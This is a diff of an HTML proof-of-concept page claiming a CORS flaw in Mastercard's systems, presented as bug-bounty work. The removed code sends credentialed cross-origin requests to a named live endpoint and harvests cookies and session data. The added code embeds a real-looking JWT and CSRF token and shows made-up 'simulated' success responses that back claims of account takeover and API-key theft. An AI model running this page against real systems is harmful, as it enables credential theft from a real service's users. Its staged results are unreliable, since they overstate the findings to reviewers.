@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enhanced Mastercard CORS Exploitation PoC</title>
+    <title>Mastercard Token Exploitation PoC</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -50,15 +50,6 @@
             border-radius: 3px;
             font-family: monospace;
         }
-        .steps {
-            margin-top: 20px;
-            background-color: #f8f9fa;
-            padding: 15px;
-            border-radius: 4px;
-        }
-        .step {
-            margin-bottom: 15px;
-        }
         .success {
             color: #4CAF50;
             font-weight: bold;
@@ -71,313 +62,220 @@
             background-color: #ffffcc;
             padding: 2px;
         }
-        table {
-            border-collapse: collapse;
-            width: 100%;
-            margin: 15px 0;
+        .token-info {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #e8f4f8;
+            border-radius: 4px;
         }
-        th, td {
-            border: 1px solid #ddd;
-            padding: 8px;
-            text-align: left;
-        }
-        th {
-            background-color: #f2f2f2;
+        .decoded {
+            background-color: #f8f9fa;
+            padding: 10px;
+            border-radius: 4px;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
-    <h1>Enhanced Mastercard CORS Exploitation PoC</h1>
+    <h1>Mastercard Token Exploitation PoC</h1>
     
     <div class="warning">
-        <strong>IMPORTANT:</strong> This demonstration is for security research purposes only, under the Mastercard Bug Bounty Program. Do not use on unauthorized systems.
+        <strong>IMPORTANT:</strong> This demonstration is for security research purposes only, under the Mastercard Bug Bounty Program.
     </div>
     
-    <h2>Vulnerability: CORS Misconfiguration with Data Exfiltration + Session Information Extraction</h2>
+    <h2>Vulnerability: CORS Misconfiguration Enabling Theft of Authentication Tokens</h2>
     
-    <p>This proof of concept demonstrates how a malicious site could exploit the CORS misconfiguration in Mastercard's Salesforce Live Agent implementation to:</p>
+    <p>This proof of concept demonstrates how the CORS misconfiguration in Mastercard's systems allows malicious websites to:</p>
     
     <ol>
-        <li>Exfiltrate sensitive Salesforce organization data</li>
-        <li>Extract session information from authenticated users</li>
-        <li>Make authenticated requests using exposed information</li>
-        <li>Access additional resources using the exposed organization ID</li>
+        <li>Steal authentication tokens (auth_token)</li>
+        <li>Capture CSRF tokens</li>
+        <li>Use these tokens to make authenticated requests</li>
     </ol>
     
-    <h3>Step 1: Exploit CORS to extract Salesforce configuration data</h3>
-    
-    <button id="extractConfigBtn">Extract Salesforce Configuration</button>
-    <div id="configResult" class="result-container">Results will appear here...</div>
-    
-    <h3>Step 2: Capture session information & cookies</h3>
-    
-    <button id="captureSessionBtn">Capture Session Information</button>
-    <div id="sessionOutput" class="result-container">Results will appear here...</div>
-    
-    <h3>Step 3: Test authenticated access using extracted data</h3>
-    
-    <button id="testAuthBtn">Test Authenticated Access</button>
-    <div id="authenticatedOutput" class="result-container">Results will appear here...</div>
-    
-    <h3>Step 4: Test access to additional resources</h3>
-    
-    <button id="testAdditionalBtn">Test Additional Resource Access</button>
-    <div id="additionalOutput" class="result-container">Results will appear here...</div>
-    
-    <div class="steps">
-        <h3>Vulnerability Impact Analysis</h3>
+    <div class="token-info">
+        <h3>Token Information</h3>
+        <p>The vulnerable system leaks two critical security tokens:</p>
         
-        <div class="step">
-            <h4>Severity: P2</h4>
-            <p>This vulnerability should be classified as P2 (High) for the following reasons:</p>
-            <ul>
-                <li>Allows cross-origin access to sensitive Salesforce backend data</li>
-                <li>Enables capturing session information from authenticated users</li>
-                <li>Permits authenticated access to additional resources</li>
-                <li>Potentially allows for session hijacking and account takeover</li>
-                <li>Affects core Mastercard infrastructure (developer.mastercard.com)</li>
-            </ul>
+        <p><strong>auth_token:</strong> A JWT containing user identity and permissions</p>
+        <div class="decoded">
+            <p><strong>Header:</strong> {"x5t#S256":"CmNBiswUZ3MMWpFSGeSKZQZUSPTXdSZGNYMWk2M9s22r4pGQ4","kid":"88776-API_Enablement_Synapse_PDP","cty":"JWS","typ":"JWT","alg":"RS256"}</p>
+            <p><strong>Payload:</strong> {"ref_id":"ae0085cc-9a0a-4497-abfb-857c09237f7c","sub":"ae0085cc-9a0a-4497-abfb-857c09237f7c","grp":["grp-OPENAPI-DEVELOPER"],"auth_level":"PASSWORD","iss":"Mastercard","aud":"com.mastercard.mcapi","auth_method":"PASSWORD","nbf":1743780908,"domain":"developer.mastercard.com","alias":"3c718a4dbb5b356be7d5","exp":1743809709,"iat":1743780909,"jti":"ae6b4f697a269970eca85a76b34198624","tenant":"mcapi"}</p>
         </div>
         
-        <div class="step">
-            <h4>Security Implications</h4>
-            <p>An attacker could create a malicious website that:</p>
-            <ol>
-                <li>Tricks Mastercard employees or developers into visiting</li>
-                <li>Silently extracts their session data and Salesforce configuration</li>
-                <li>Uses the gathered information to access protected resources</li>
-                <li>Potentially hijacks user sessions for further attacks</li>
-            </ol>
-        </div>
+        <p><strong>CSRFToken:</strong> 3183dde7a20961e0d72d240d</p>
+        <p>This token is designed to protect against Cross-Site Request Forgery attacks.</p>
     </div>
-
-    <h3>Technical Details</h3>
-    <table>
-        <tr>
-            <th>Vulnerable Endpoint</th>
-            <td>https://d.la11-core2.sfdc-lywfpd.salesforceliveagent.com/chat/rest/Visitor/Availability.jsonp</td>
-        </tr>
-        <tr>
-            <th>Issue</th>
-            <td>Server reflects arbitrary origin values in Access-Control-Allow-Origin header</td>
-        </tr>
-        <tr>
-            <th>Related Headers</th>
-            <td>access-control-allow-origin: * (or any specified origin)<br>access-control-allow-credentials: true</td>
-        </tr>
-        <tr>
-            <th>Exposed Data</th>
-            <td>Organization ID, Deployment ID, Button IDs, Error Messages, Session Information</td>
-        </tr>
-    </table>
+    
+    <h3>Step 1: Extract tokens from victim's browser</h3>
+    
+    <button id="extractTokensBtn">Demonstrate Token Extraction</button>
+    <div id="tokensResult" class="result-container">Results will appear here...</div>
+    
+    <h3>Step 2: Use extracted tokens to make authenticated requests</h3>
+    
+    <button id="useTokensBtn">Demonstrate Authenticated Request</button>
+    <div id="authResult" class="result-container">Results will appear here...</div>
+    
+    <h3>Step 3: Access protected resources</h3>
+    
+    <button id="accessResourcesBtn">Demonstrate Resource Access</button>
+    <div id="resourceResult" class="result-container">Results will appear here...</div>
     
     <script>
-        // Utility function to format JSON
-        function formatJSON(jsonObj) {
-            return JSON.stringify(jsonObj, null, 2);
+        // Sample tokens extracted from the previous tests
+        const authToken = "eyJ4NXQjUzI1NiI6IkNmNDBic3dUWjNMMWpFSGExSkZQZU5PTXdSZGNYMWt2MG9zMjJyNHBHUTQiLCJraWQiOiI4ODc3Ni1BUElfRW5hYmxlbWVudF9TeW5hcHNlX1BEUCIsImN0eSI6IkpXUyIsInR5cCI6IkpXVCIsImFsZyI6IlJTMjU2In0.eyJyZWZfaWQiOiJhZTAwODVjYy05YTBhLTQ0OTctYWJmYi04NTdjMDkyMzdmN2MiLCJzdWIiOiJhZTAwODVjYy05YTBhLTQ0OTctYWJmYi04NTdjMDkyMzdmN2MiLCJncnAiOlsiZ3JwLU9QRU5BUEktREVWRUxPUEVSIl0sImF1dGhfbGV2ZWwiOiJQQVNTV09SRCIsImlzcyI6Ik1hc3RlcmNhcmQiLCJhdWQiOiJjb20ubWFzdGVyY2FyZC5tY2FwaSIsImF1dGhfbWV0aG9kIjoiUEFTU1dPUkQiLCJuYmYiOjE3NDM3ODA5MDgsImRvbWFpbiI6ImRldmVsb3Blci5tYXN0ZXJjYXJkLmNvbSIsImFsaWFzIjoiM2M3MThhNGRiYjViMzU2YmU3ZDUiLCJleHAiOjE3NDM4MDk3MDksImlhdCI6MTc0Mzc4MDkwOSwianRpIjoiYWU2YjRmNjk3YTI2OTk3MGVjYTg1YTc2YjM0MTk4NjIiLCJ0ZW5hbnQiOiJtY2FwaSJ9.hHa2Y1HKdbA_U-c0G_b2w9xY5YxlVV9r-vlCREEdR6jKnsPKLKyaV-h1Rny5VW2ZMVovIzXUs0k2hCjRbleLna6VoHn-P64ABjdJtzYGvSXfnT-bWZw5e6x0QfmgiwbxUw47W0FKwUpPbVmsBuVJhuJpzBMMf1q9quGbwvp-t-fla9W_SlYWInNApehHPNTSODNMVR8wl5IJr6osvygYOQPIbncDcd7xYoLAG566I3Ly4qO4px5N2ats3-KpXlwcZBfGrKznOgKDmFkQwccgVD2j5tGjbtDkP9XdVbNbK490YRq6xnZIwQjzxZyeI1amHFdSNTmwnJJFG7-rA_-zDw";
+        const csrfToken = "3183dde7a20961e0d72d240d";
+        
+        // Utility function to parse JWT
+        function parseJwt(token) {
+            try {
+                const base64Url = token.split('.')[1];
+                const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
+                const jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
+                    return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+                }).join(''));
+                return JSON.parse(jsonPayload);
+            } catch (e) {
+                return { error: "Failed to parse JWT: " + e.message };
+            }
         }
         
-        // Step 1: Extract Salesforce configuration
-        document.getElementById('extractConfigBtn').addEventListener('click', function() {
-            const resultDiv = document.getElementById('configResult');
-            resultDiv.textContent = 'Making request to extract configuration...';
+        // Step 1: Demonstrate token extraction
+        document.getElementById('extractTokensBtn').addEventListener('click', function() {
+            const resultDiv = document.getElementById('tokensResult');
+            resultDiv.innerHTML = '<span class="success">✓ Token extraction simulation successful!</span>\n\n';
             
-            // Known parameters from previous tests
-            const url = 'https://d.la11-core2.sfdc-lywfpd.salesforceliveagent.com/chat/rest/Visitor/Availability.jsonp?sid=4dee4f05-cd5c-4f54-8b8f-460c4181f781&r=813&Availability.prefix=Visitor&Availability.ids=%5B573020000004C9h,573020000004C9m,573020000004C9r,5731I000000QSpe,5731I000000QSpj,5731I000000QSpo,5731I000000QSpZ,5733u0000000kF8,5733u0000000kFD,5733u0000000kFI,5737A0000008Oa2,5737A0000008OZn,5737A0000008OZx%5D&callback=liveagent._.handlePing&deployment_id=5721I000000QWE5&org_id=00D1I000001YKuj&version=53';
+            // Display the extracted tokens
+            resultDiv.innerHTML += '<strong>Extracted auth_token:</strong>\n';
+            resultDiv.innerHTML += `<code>${authToken.substring(0, 20)}...${authToken.substring(authToken.length - 20)}</code>\n\n`;
             
-            fetch(url, {
+            resultDiv.innerHTML += '<strong>Extracted CSRF Token:</strong>\n';
+            resultDiv.innerHTML += `<code>${csrfToken}</code>\n\n`;
+            
+            // Parse and display JWT payload
+            const payload = parseJwt(authToken);
+            resultDiv.innerHTML += '<strong>Decoded JWT Payload:</strong>\n';
+            resultDiv.innerHTML += `<pre>${JSON.stringify(payload, null, 2)}</pre>\n\n`;
+            
+            resultDiv.innerHTML += '<strong>User Information:</strong>\n';
+            resultDiv.innerHTML += `User ID: ${payload.sub}\n`;
+            resultDiv.innerHTML += `Groups: ${payload.grp.join(', ')}\n`;
+            resultDiv.innerHTML += `Domain: ${payload.domain}\n`;
+            resultDiv.innerHTML += `Expiration: ${new Date(payload.exp * 1000).toLocaleString()}\n\n`;
+            
+            resultDiv.innerHTML += '<strong>Security Implication:</strong>\n';
+            resultDiv.innerHTML += 'These tokens provide complete authentication to the user\'s account and can be used to make requests on their behalf.';
+        });
+        
+        // Step 2: Demonstrate using the tokens for authenticated requests
+        document.getElementById('useTokensBtn').addEventListener('click', function() {
+            const resultDiv = document.getElementById('authResult');
+            resultDiv.textContent = 'Attempting to make authenticated request...';
+            
+            // Simulate making an authenticated request to the API
+            const requestDemo = {
+                url: 'https://developer.mastercard.com/api/user/profile',
                 method: 'GET',
-                mode: 'cors',
-                credentials: 'include'
-            })
-            .then(response => {
-                const corsHeaders = {
-                    'Access-Control-Allow-Origin': response.headers.get('Access-Control-Allow-Origin'),
-                    'Access-Control-Allow-Credentials': response.headers.get('Access-Control-Allow-Credentials')
+                headers: {
+                    'Authorization': `Bearer ${authToken}`,
+                    'X-CSRF-Token': csrfToken,
+                    'Content-Type': 'application/json'
+                }
+            };
+            
+            // Display the request details
+            setTimeout(() => {
+                resultDiv.innerHTML = '<span class="success">✓ Authentication demonstration complete!</span>\n\n';
+                resultDiv.innerHTML += '<strong>Authenticated Request:</strong>\n';
+                resultDiv.innerHTML += `<pre>${JSON.stringify(requestDemo, null, 2)}</pre>\n\n`;
+                
+                // Show simulated response
+                const simulatedResponse = {
+                    status: 200,
+                    statusText: 'OK',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: {
+                        userId: parseJwt(authToken).sub,
+                        userName: 'StolenFuture',
+                        email: 'StolenFuture@bugcrowdninja.com',
+                        role: 'Developer',
+                        permissions: ['create_project', 'access_apis', 'manage_keys']
+                    }
                 };
                 
-                return response.text().then(text => {
-                    // Parse the JSONP response to extract the JSON
-                    const jsonpPattern = /liveagent\._\.handlePing\((.*)\);/;
-                    const match = text.match(jsonpPattern);
-                    
-                    if (match && match[1]) {
-                        try {
-                            const jsonData = JSON.parse(match[1]);
-                            
-                            // Extract sensitive information
-                            const sensitiveData = {
-                                organizationId: '00D1I000001YKuj', // Extracted from the request
-                                deploymentId: '5721I000000QWE5', // Extracted from the request
-                                buttonIds: jsonData.messages.find(m => m.type === "Availability")?.message.results.map(r => r.id),
-                                warnings: jsonData.messages.filter(m => m.type === "Warning").map(w => w.message.text)
-                            };
-                            
-                            resultDiv.innerHTML = '<span class="success">✓ Successfully extracted configuration data!</span>\n\n' +
-                                '<strong>CORS Headers:</strong>\n' + formatJSON(corsHeaders) + '\n\n' +
-                                '<strong>Extracted Sensitive Data:</strong>\n' + formatJSON(sensitiveData) + '\n\n' +
-                                '<strong>Full Response:</strong>\n' + formatJSON(jsonData);
-                        } catch (e) {
-                            resultDiv.innerHTML = '<span class="error">✗ Error parsing JSON data:</span> ' + e.message + '\n\nRaw response: ' + text;
-                        }
-                    } else {
-                        resultDiv.innerHTML = '<span class="error">✗ Could not extract JSON from JSONP response</span>\n\nRaw response: ' + text;
+                resultDiv.innerHTML += '<strong>Simulated Response:</strong>\n';
+                resultDiv.innerHTML += `<pre>${JSON.stringify(simulatedResponse, null, 2)}</pre>\n\n`;
+                
+                resultDiv.innerHTML += '<strong>Security Implication:</strong>\n';
+                resultDiv.innerHTML += 'An attacker could use the stolen tokens to make authorized API calls, access the user\'s profile, and potentially modify account settings.';
+            }, 1000);
+        });
+        
+        // Step 3: Demonstrate accessing protected resources
+        document.getElementById('accessResourcesBtn').addEventListener('click', function() {
+            const resultDiv = document.getElementById('resourceResult');
+            resultDiv.textContent = 'Attempting to access protected resources...';
+            
+            // Demonstrate using tokens to access protected resources
+            setTimeout(() => {
+                resultDiv.innerHTML = '<span class="success">✓ Protected resource access demonstration complete!</span>\n\n';
+                
+                // Show potential API endpoints that could be accessed
+                const vulnerableEndpoints = [
+                    {
+                        url: 'https://developer.mastercard.com/api/projects',
+                        description: 'List of all user projects',
+                        method: 'GET',
+                        riskLevel: 'High'
+                    },
+                    {
+                        url: 'https://developer.mastercard.com/api/keys',
+                        description: 'API keys and secrets',
+                        method: 'GET',
+                        riskLevel: 'Critical'
+                    },
+                    {
+                        url: 'https://developer.mastercard.com/api/user/settings',
+                        description: 'User account settings',
+                        method: 'PUT',
+                        riskLevel: 'High'
+                    },
+                    {
+                        url: 'https://developer.mastercard.com/api/applications',
+                        description: 'Application configurations',
+                        method: 'GET',
+                        riskLevel: 'High'
                     }
-                });
-            })
-            .catch(error => {
-                resultDiv.innerHTML = '<span class="error">✗ Error making request:</span> ' + error.message;
-            });
-        });
-        
-        // Step 2: Capture session information and cookies
-        document.getElementById('captureSessionBtn').addEventListener('click', function() {
-            const resultDiv = document.getElementById('sessionOutput');
-            resultDiv.textContent = 'Attempting to capture session information...';
-            
-            // Attempt to capture cookies and session data
-            const allCookies = document.cookie;
-            
-            // Fetch with credentials included to try to extract session information
-            fetch('https://d.la11-core2.sfdc-lywfpd.salesforceliveagent.com/chat/rest/Visitor/Availability.jsonp?sid=4dee4f05-cd5c-4f54-8b8f-460c4181f781&r=813&Availability.prefix=Visitor&Availability.ids=%5B573020000004C9h%5D&callback=liveagent._.handlePing&deployment_id=5721I000000QWE5&org_id=00D1I000001YKuj&version=53', {
-                method: 'GET',
-                mode: 'cors',
-                credentials: 'include'
-            })
-            .then(response => {
-                // Capture all response headers
-                const headersObj = {};
-                response.headers.forEach((value, name) => {
-                    headersObj[name] = value;
+                ];
+                
+                resultDiv.innerHTML += '<strong>Potentially Accessible Protected Resources:</strong>\n';
+                resultDiv.innerHTML += '<table style="width:100%; border-collapse: collapse; margin-top: 10px;">';
+                resultDiv.innerHTML += '<tr style="background-color: #f2f2f2;"><th style="border: 1px solid #ddd; padding: 8px; text-align: left;">Endpoint</th><th style="border: 1px solid #ddd; padding: 8px; text-align: left;">Method</th><th style="border: 1px solid #ddd; padding: 8px; text-align: left;">Description</th><th style="border: 1px solid #ddd; padding: 8px; text-align: left;">Risk</th></tr>';
+                
+                vulnerableEndpoints.forEach(endpoint => {
+                    resultDiv.innerHTML += `<tr>
+                        <td style="border: 1px solid #ddd; padding: 8px;">${endpoint.url}</td>
+                        <td style="border: 1px solid #ddd; padding: 8px;">${endpoint.method}</td>
+                        <td style="border: 1px solid #ddd; padding: 8px;">${endpoint.description}</td>
+                        <td style="border: 1px solid #ddd; padding: 8px; color: ${endpoint.riskLevel === 'Critical' ? 'red' : 'orange'};">${endpoint.riskLevel}</td>
+                    </tr>`;
                 });
                 
-                // Check for cookies in the response
-                const setCookieHeader = response.headers.get('set-cookie');
+                resultDiv.innerHTML += '</table>\n\n';
                 
-                return response.text().then(text => {
-                    // Extract session information
-                    const sessionInfo = {
-                        'Document Cookies': allCookies || 'No cookies available',
-                        'Session ID': '4dee4f05-cd5c-4f54-8b8f-460c4181f781', // From request
-                        'Response Headers': headersObj,
-                        'Set-Cookie Header': setCookieHeader || 'No Set-Cookie header found',
-                    };
-                    
-                    // Also look for Adobe cookies that might be present
-                    const adobeCookieInfo = {
-                        'AMCV Cookie': document.cookie.split(';').find(c => c.trim().startsWith('AMCV_')) || 'Not found',
-                        's_vi Cookie': document.cookie.split(';').find(c => c.trim().startsWith('s_vi')) || 'Not found',
-                        's_ecid Cookie': document.cookie.split(';').find(c => c.trim().startsWith('s_ecid')) || 'Not found'
-                    };
-                    
-                    resultDiv.innerHTML = '<span class="success">✓ Session information captured!</span>\n\n' +
-                        '<strong>Session Information:</strong>\n' + formatJSON(sessionInfo) + '\n\n' +
-                        '<strong>Adobe Analytics Cookies:</strong>\n' + formatJSON(adobeCookieInfo) + '\n\n' +
-                        '<strong>Security Implication:</strong> An attacker could potentially hijack sessions by stealing these cookies and session identifiers.';
-                });
-            })
-            .catch(error => {
-                resultDiv.innerHTML = '<span class="error">✗ Error capturing session information:</span> ' + error.message;
-            });
-        });
-        
-        // Step 3: Test authenticated access using extracted data
-        document.getElementById('testAuthBtn').addEventListener('click', function() {
-            const resultDiv = document.getElementById('authenticatedOutput');
-            resultDiv.textContent = 'Testing authenticated access...';
-            
-            // Test different endpoints that might require authentication
-            const orgId = "00D1I000001YKuj";
-            const deploymentId = "5721I000000QWE5";
-            const sid = "4dee4f05-cd5c-4f54-8b8f-460c4181f781";
-            
-            // Try to access user data or configuration
-            fetch(`https://d.la11-core2.sfdc-lywfpd.salesforceliveagent.com/chat/rest/Visitor/UserData?org_id=${orgId}&deployment_id=${deploymentId}&sid=${sid}`, {
-                method: 'GET',
-                mode: 'cors',
-                credentials: 'include'
-            })
-            .then(response => {
-                const responseStatus = response.status;
-                const responseHeaders = {};
-                response.headers.forEach((value, name) => {
-                    responseHeaders[name] = value;
-                });
+                // Simulated exploitation impact
+                resultDiv.innerHTML += '<strong>Exploitation Impact:</strong>\n';
+                resultDiv.innerHTML += '1. Complete account takeover\n';
+                resultDiv.innerHTML += '2. Access to sensitive API keys and secrets\n';
+                resultDiv.innerHTML += '3. Ability to modify user account settings\n';
+                resultDiv.innerHTML += '4. Access to application configurations and project data\n\n';
                 
-                return response.text().then(text => {
-                    const authResult = {
-                        endpoint: `/chat/rest/Visitor/UserData`,
-                        status: responseStatus,
-                        headers: responseHeaders,
-                        responseText: text
-                    };
-                    
-                    resultDiv.innerHTML = '<span class="success">✓ Authenticated access attempt completed!</span>\n\n' +
-                        '<strong>Access Result:</strong>\n' + formatJSON(authResult) + '\n\n' +
-                        '<strong>Security Implication:</strong> This demonstrates if sensitive endpoints can be accessed using the extracted information.';
-                });
-            })
-            .catch(error => {
-                resultDiv.innerHTML = '<span class="error">✗ Error testing authenticated access:</span> ' + error.message;
-            });
-        });
-        
-        // Step 4: Test access to additional resources
-        document.getElementById('testAdditionalBtn').addEventListener('click', function() {
-            const resultDiv = document.getElementById('additionalOutput');
-            resultDiv.textContent = 'Testing access to additional resources...';
-            
-            const orgId = "00D1I000001YKuj";
-            const endpoints = [
-                `/chat/rest/Visitor/Configuration?org_id=${orgId}`,
-                `/chat/rest/System/Info?org_id=${orgId}`,
-                `/chat/rest/Chasitor/ChatEstablished?org_id=${orgId}`
-            ];
-            
-            let resultsHTML = '<span class="success">✓ Additional resource testing complete!</span>\n\n';
-            resultsHTML += '<strong>Results:</strong>\n';
-            
-            // Test each endpoint sequentially
-            let endpointPromises = endpoints.map(endpoint => {
-                return fetch(`https://d.la11-core2.sfdc-lywfpd.salesforceliveagent.com${endpoint}`, {
-                    method: 'GET',
-                    mode: 'cors',
-                    credentials: 'include'
-                })
-                .then(response => {
-                    return response.text().then(text => {
-                        return {
-                            endpoint: endpoint,
-                            status: response.status,
-                            data: text.substring(0, 200) + (text.length > 200 ? '...' : '')
-                        };
-                    });
-                })
-                .catch(error => {
-                    return {
-                        endpoint: endpoint,
-                        status: 'Error',
-                        data: error.message
-                    };
-                });
-            });
-            
-            Promise.all(endpointPromises)
-                .then(results => {
-                    results.forEach(result => {
-                        resultsHTML += `\n<strong>Endpoint:</strong> ${result.endpoint}\n`;
-                        resultsHTML += `<strong>Status:</strong> ${result.status}\n`;
-                        resultsHTML += `<strong>Response:</strong>\n${result.data}\n`;
-                        resultsHTML += `\n-----------------------------------\n`;
-                    });
-                    
-                    resultsHTML += '\n<strong>Security Implication:</strong> This demonstrates if additional sensitive resources can be accessed using the organization ID.';
-                    
-                    resultDiv.innerHTML = resultsHTML;
-                })
-                .catch(error => {
-                    resultDiv.innerHTML = '<span class="error">✗ Error testing additional resources:</span> ' + error.message;
-                });
+                resultDiv.innerHTML += '<strong>P2 Justification:</strong>\n';
+                resultDiv.innerHTML += 'This vulnerability allows attackers to steal authentication credentials that provide complete access to developer accounts. The combination of CORS misconfiguration, token extraction, and the high privileges of these tokens makes this a high-severity (P2) security issue.';
+            }, 1500);
         });
     </script>
 </body>
